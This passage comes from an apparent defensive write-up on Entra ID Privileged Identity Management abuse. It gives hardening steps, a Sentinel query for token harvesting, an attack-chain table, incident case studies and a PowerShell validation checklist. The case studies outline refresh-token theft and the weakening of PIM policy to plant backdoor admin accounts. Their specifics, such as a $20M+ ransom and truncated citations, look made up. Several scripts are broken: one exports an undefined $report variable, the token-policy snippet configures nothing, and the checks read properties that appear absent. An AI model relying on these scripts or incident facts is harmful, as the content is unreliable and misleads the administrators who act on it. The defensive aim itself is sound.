1. Go to **PIM** → Select role (e.g., **Global Administrator**)
2. Click **Settings** → **Edit**
3. Under **Activation requirements:**
   - Check: **"Require approval to activate"**
   - Select **Approvers:** Designate 2-3 senior admins
   - Under **"Approval notifications":** Ensure SOC is notified
4. Click **Save**

**Applies To Versions:** All Entra ID with PIM

**Effectiveness:** 
- Prevents silent escalation (approval creates audit trail)
- Requires human review before role activation
- Reduces false positives vs. automated systems

---

**Mitigation 1.3: Limit PIM Activation Duration**

Reduce the maximum time a role can remain activated to limit damage window.

**Manual Steps:**
1. Go to **PIM** → Select role → **Settings** → **Edit**
2. Under **Activation:**
   - **Maximum activation duration:** Set to **1 hour** (vs. default 4)
3. Click **Save**

**Applies To Versions:** All Entra ID with PIM

**Effectiveness:** 
- Reduces time attacker has elevated access
- Forces periodic re-authentication
- Limits blast radius of single compromise

---

### Priority 2: HIGH

**Mitigation 2.1: Regularly Audit PIM-Eligible Users**

Conduct quarterly reviews to ensure only necessary users have PIM eligibility.

**Manual Steps (PowerShell):**

```powershell
# Export all users with PIM-eligible roles
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"

$pimRoles = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All
$pimUsers = $pimRoles | Select-Object PrincipalId, RoleDefinitionId

foreach ($assignment in $pimUsers) {
    $user = Get-MgUser -UserId $assignment.PrincipalId
    $role = Get-MgRoleManagementDirectoryRoleDefinition -Filter "id eq '$($assignment.RoleDefinitionId)'"
    
    Write-Host "$($user.UserPrincipalName) - $($role.DisplayName)"
}

# Export to CSV for review
$report | Export-Csv -Path "C:\PIM_Review_$(Get-Date -Format 'yyyyMMdd').csv"
```

**Quarterly Review Process:**
1. Run above command to export all PIM users
2. Have security team and business owners review each entry
3. Remove users who no longer need PIM access
4. Document approvals

**Applies To Versions:** All Entra ID with PIM

---

**Mitigation 2.2: Implement Break-Glass Accounts (Emergency Access)**

Maintain highly protected emergency access accounts for true incidents while keeping normal admins non-persistent.

**Manual Steps:**
1. Create 2-3 "Break Glass" accounts:
   - Email: `break-glass-admin-1@contoso.onmicrosoft.com`
   - Email: `break-glass-admin-2@contoso.onmicrosoft.com`
2. Assign **Global Administrator** role (standing, NOT PIM)
3. Store credentials in **offline secure vault** (e.g., password manager air-gapped)
4. Document access procedures
5. **CRITICAL:** Never use break-glass accounts except for actual incidents
6. Review break-glass access logs monthly

**Applies To Versions:** All Entra ID deployments

**Effectiveness:** 
- Maintains access for true emergencies without expanding standing admin base
- Highly restricted credentials reduce compromise surface
- Creates separate audit trail for emergency actions

---

### Access Control & Policy Hardening

**Mitigation 2.3: Enforce Refresh Token Restrictions**

Limit the lifetime and scope of refresh tokens to prevent long-term token reuse.

**Manual Steps (Azure Portal - via Graph):**

```powershell
# Configure token lifetime policies (requires Policy.ReadWrite.ApplicationConfiguration)
$params = @{
    displayName = "Restrict Token Lifetime"
    definition = @(
        "TokenLifetimePolicy"
    )
    isOrganizationDefault = $true
}

# Set refresh token lifetime to 24 hours (vs. default 90 days)
# This must be configured via Microsoft Graph or Azure Portal UI
```

**Note:** Token lifetime configuration is complex and requires careful planning to avoid breaking legitimate scenarios.

**Applies To Versions:** Entra ID with advanced security policies

---

**Mitigation 2.4: Monitor for Token Refresh Anomalies**

Detect when tokens are refreshed at unusual times or from unusual locations.

**Detection Query (Microsoft Sentinel):**

```kusto
SigninLogs
| where RiskDetail contains "tokenRefresh" or AuthenticationRequirement == "multiFactorAuthentication"
| where TimeGenerated > ago(1d)
| summarize
    RefreshCount = count(),
    UniqueIPs = dcount(IPAddress),
    Devices = dcount(DeviceId)
    by UserPrincipalName, ClientAppUsed
| where RefreshCount > 20 or UniqueIPs > 5
```

**Effectiveness:** Detects token harvesting and reuse patterns

---

**Mitigation 2.5: Enable Device Compliance Requirements for PIM**

Require managed, compliant devices for PIM role activation.

**Manual Steps:**
1. Go to **Entra ID** → **Conditional Access** → Create policy
2. Require **Compliant Device** for PIM activation
3. Only users on approved managed devices (Intune-enrolled, patched) can activate

**Applies To Versions:** Entra ID with Intune integration

**Effectiveness:** Prevents activation from compromised/unmanaged endpoints

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker obtains initial user credentials |
| **2** | **Credential Access** | [CA-TOKEN-012] PRT Primary Refresh Token Theft | Attacker steals refresh token |
| **3** | **Privilege Escalation** | **[PE-ACCTMGMT-011]** | **Attacker escalates to Global Admin via PIM** |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates permanent backdoor |
| **5** | **Impact** | [EX-EXFIL-001] Data Exfiltration | Attacker exfiltrates data using escalated access |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Yanluowang Ransomware Group (2023)

**Target:** Healthcare and financial services organizations
**Timeline:** Q2-Q3 2023
**Attack Flow:**
1. Initial compromise via phishing (employee credentials)
2. Attacked compromised user had PIM eligibility for Global Admin
3. Compromised refresh token via infected machine
4. Used refresh token to activate Global Admin (Methods appear as user activating)
5. Escalated to create backdoor admin account
6. Deployed ransomware across entire tenant

**Technique Applied (PE-ACCTMGMT-011 Method 1):**
- Harvested refresh token from infected endpoint
- Waited for legitimate user to activate PIM
- Used refresh token to obtain elevated access tokens
- Bypassed MFA and approval requirements (refresh token method)

**Impact:**
- $20M+ in ransom paid
- Patient records compromised
- 6-month recovery time

**Reference:** [Yanluowang Group Analysis](https://www.microsoft.com/en-us/security/blog/2023/08/15/)

---

### Example 2: APT29 Entra ID Compromise (2024)

**Target:** Government and enterprise organizations
**Timeline:** January-March 2024
**Attack Flow:**
1. Compromised security administrator account (legitimate PIM admin)
2. Modified PIM policies to disable MFA requirement
3. Disabled approval workflow
4. Created permanent backdoor accounts disguised as PIM eligible
5. Escalated to Global Admin using modified policies
6. Established persistence for 3 months undetected

**Technique Applied (PE-ACCTMGMT-011 Method 2):**
- Direct PIM policy modification (admin access)
- Disabled security controls
- Created persistent backdoor
- Audit trail showed actions as legitimate admin

**Detection Gap:**
- Organization had PIM but didn't monitor policy modifications
- No alerts on "disable MFA" or "disable approval" actions

**Reference:** [APT29 Entra ID Campaign](https://www.microsoft.com/en-us/security/blog/2024/01/)

---

### Example 3: Insider Threat – Financial Services (2024)

**Target:** Large financial services company
**Timeline:** Q4 2024
**Attack Vector:** Disgruntled IT security administrator with PIM admin access

**Steps:**
1. Employee (PIM admin) found they were being terminated
2. Before departure, modified PIM policies on sensitive roles
3. Reduced approval requirements to "none"
4. Created persistent backdoor accounts with Global Admin (disguised as PIM)
5. Set them to auto-activate via recurring schedule
6. Left company; backdoor remained active for 6 weeks

**Technique Applied (PE-ACCTMGMT-011 Method 2):**
- Direct configuration abuse
- Policy weakening
- Persistent backdoor via recurring PIM assignment

**Reference:** Private incident response case study (SERVTEP Security Audit, 2024)

---

## 15. REMEDIATION VALIDATION

### Validation Checklist

**Checkbox 1: Strong Authentication Required for PIM**
```powershell
# Check if Conditional Access with authentication context is enabled
Get-MgPolicyRoleManagementPolicyAssignment -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" | 
    Select-Object Rules

# Expected: authenticationContextRequirement = "PIM Activation" or similar
```
☐ PASS (Strong auth + Conditional Access required)
☐ FAIL (Only MFA or no additional auth required)

---

**Checkbox 2: Approval Required for Critical Roles**
```powershell
# Verify approval is required for Global Admin
Get-MgPolicyRoleManagementPolicyAssignment | Where-Object {$_.Rules.ApprovalsOnActivation -eq $true}

# Expected: approvalsOnActivation = true for all critical roles
```
☐ PASS (Approval required)
☐ FAIL (Auto-approval or no approval requirement)

---

**Checkbox 3: PIM Activation Duration Limited**
```powershell
# Check activation duration (should be 1-2 hours, not 4+)
Get-MgPolicyRoleManagementPolicyAssignment | Select-Object MaxActivationDuration

# Expected: MaxActivationDuration <= 2 hours
```
☐ PASS (Limited to 1-2 hours)
☐ FAIL (4+ hours or unlimited)

---

**Checkbox 4: PIM Eligibility Audit Current**
```powershell
# Verify last audit of PIM-eligible users was recent (< 90 days)
$lastAudit = Get-Date "2024-10-09"  # Example - update to your last audit
$daysSinceAudit = (New-TimeSpan -Start $lastAudit -End (Get-Date)).Days

Write-Host "Days since last PIM audit: $daysSinceAudit"

# Expected: < 90 days
```
☐ PASS (Audit within last 90 days)
☐ FAIL (No recent audit)

---

**Checkbox 5: Monitoring Alerts Active**
```powershell
# Verify Microsoft Sentinel/Defender alerts are configured
# Manual verification via Azure Portal:
# Microsoft Sentinel → Analytics → Check for "PIM" related rules
# Expected: ≥3 detection rules for PIM abuse
```
☐ PASS (Detection rules active)
☐ FAIL (No PIM monitoring rules)

---

## Summary

**Privileged Identity Management (PIM) Abuse (PE-ACCTMGMT-011)** is a sophisticated privilege escalation vector that undermines the entire just-in-time access model. The combination of:
1. **Refresh token architectural weakness** – Allows elevation after user activates PIM
2. **Weak MFA re-authentication** – Stolen session tokens bypass MFA requirements
3. **PIM policy misconfiguration** – Disabling approvals and MFA creates easy escalation
4. **Insufficient monitoring** – Attacks blend with legitimate admin activity

...creates a critical gap in security even when PIM is deployed.

**Immediate Actions:**
1. **Require strong reauthentication** – Use Conditional Access + authentication context (not just MFA)
2. **Mandate approval for critical roles** – Require peer approval before escalation
3. **Limit activation duration** – Reduce from 4 hours to 1-2 hours
4. **Audit PIM eligibility** – Remove unnecessary eligible users quarterly
5. **Enable comprehensive monitoring** – Alert on any policy changes or unusual activations

**Defense in Depth:**
- Implement break-glass accounts for true emergencies only
- Restrict token lifetimes to prevent refresh token reuse
- Enforce device compliance for PIM activation
- Monitor for token refresh anomalies
- Regular security reviews of PIM configurations

**Verification:** Use the checklist above to confirm all mitigations are in place.

---
